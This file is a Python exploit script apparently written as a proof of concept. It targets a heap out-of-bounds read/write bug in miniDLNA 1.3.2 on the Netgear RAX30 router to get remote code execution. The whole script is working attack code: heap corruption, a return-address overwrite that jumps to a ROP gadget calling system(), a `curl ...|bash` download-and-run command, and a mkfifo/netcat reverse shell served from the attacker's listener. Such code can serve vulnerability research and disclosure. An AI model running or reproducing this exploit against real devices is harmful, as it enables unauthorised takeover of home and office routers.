#!/usr/bin/env python3
import pwn
import pwnlib
import sys
import socket
import time
import argparse

from helper import Payload
from helper import connect_sockets
from helper import create_sockets
from helper import hexarg
from helper import pad
from helper import sendsocks
from helper import TIME
from helper import xpr, xerr
from helper import heap_corruption
from helper import asciitxt

ALLOC_SIZE = 0x60-8
LIBC_SYSTEM = 0x3e3b6548
ROP_GADGET = 0x4001aeec
STACK_BASE = 0x3ffff250


if __name__ == "__main__":
    poc_parser = argparse.ArgumentParser(
        add_help=True,
        description='Netgear RAX30 miniDLNA 1.3.2 Heap OOB R/W RCE exploit, reverse shell (by @hyprdude)',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    poc_parser.add_argument(
        'target_ip',
        help='IP address of host running the service')
    poc_parser.add_argument(
        '--target_port',
        default=8200,
        help="Target port",
        type=int)
    poc_parser.add_argument(
        '--lhost',
        default="10.10.13.20",
        help="Bind IP for reverse shell listener",
        type=str)
    poc_parser.add_argument(
        '--lport',
        default=1337,
        help="Bind port for reverse shell listener",
        type=int)
    poc_parser.add_argument(
        '--rip_addr',
        default=ROP_GADGET, # ROP gadget address
        help="Value to write at `stack_frame` return address (defaults to ROP gadget at 0x%(default)x)",
        type=hexarg)
    poc_parser.add_argument(
        '--stack_frame',
        default=STACK_BASE, # stack address
        help="Address we want malloc to return (defaults to a stack frame at 0x%(default)x)",
        type=hexarg)

    args = poc_parser.parse_args()
    arguments = ['target_ip']
    for i in arguments:
        if getattr(args, i) is None:
            poc_parser.print_help()
            sys.exit(1)

    # banner
    print(asciitxt)
    xpr(f"target: {args.target_ip}:{args.target_port}")
    xpr(f"reverse shell listener at: {args.lhost}:{args.lport}")

    # perform the heap corruption to get everything set up to have malloc return
    # the pointer to the target stack frame on a subsequent allocation
    _ = heap_corruption(args.stack_frame, args.target_ip, args.target_port)

    # set up the payload to write at target address when we get it allocated back;
    # STACK_OFFSET is a pointer to the stack location where we'll be writing this payload, plus
    # an offset to push it further into the string to where the command string is (see below).
    # the ROP gadget we jump to by default will pop this pointer into the r0 register which will
    # get passed to system()
    xpr(f"overwriting $pc at 0x{args.stack_frame+12:x} with address: 0x{args.rip_addr:x}")
    rip_target = pwn.p32(args.rip_addr, endian='little')
    command_str_offset = args.stack_frame + 0x30
    stack_string_addr = pwn.p32(command_str_offset, endian='little')
    pad0 = b"AAAAAAAA"
    rip_payload = stack_string_addr + pad0 + rip_target

    # set up the command line passed to system()
    command_line = f"`curl {args.lhost}:{args.lport}|bash`".encode()

    # construct the final payload and add any needed padding
    system_addr = pwn.p32(LIBC_SYSTEM, endian='little')
    padded_payload = rip_payload + (system_addr * 8) + command_line
    padded_payload = pad(ALLOC_SIZE, padded_payload)

    # first listener for staging rev shell script over http
    l = pwn.listen(args.lport)

    # we need to make at least 3 alloc's to get the right chunk back
    final = create_sockets(3)
    connect_sockets(final, args.target_ip, args.target_port)
    sendsocks(final, padded_payload)

    # close the last request we connected to free the req_buf and trigger the exploit
    final.pop().close()

    # this is the script that will be piped to a shell to spawn the reverse shell
    reverse_shell_cmd = f"rm -f /tmp/f; mkfifo /tmp/f;"
    reverse_shell_cmd += f"cat /tmp/f | /bin/sh -i 2>&1 | nc {args.lhost} {args.lport} >/tmp/f"
    resp = f"HTTP/1.1 200 OK\r\nContent-Length: {len(reverse_shell_cmd)}\r\n"
    resp += f"Connection: Closed\r\n\r\n"

    # handle the http request to serve script to spawn reverse shell
    l.settimeout(1)
    x = l.wait_for_connection()
    if x.connected():
        l.sendline(resp.encode() + reverse_shell_cmd.encode())
        l.close()
    else:
        xpr("=ERROR=: Timed out waiting for staging connection, exploit likely failed")
        xpr("tip: try adjusting the --stack_frame default argument up/down in 0x10-byte blocks")
        sys.exit(1)

    # wait for the incoming reverse shell connection; bail if we don't get it in a second.
    l = pwn.listen(args.lport)
    l.settimeout(1)
    x = l.wait_for_connection()
    if x.connected():
        xpr("~~~ <CHONKCHONKCHONK> ~~~")
        l.interactive()
    else:
        xpr("=ERROR=: Timed out waiting for staging connection, exploit likely failed")
        xpr("tip: try adjusting the --stack_frame default argument up/down in 0x10-byte blocks")
        sys.exit(1)

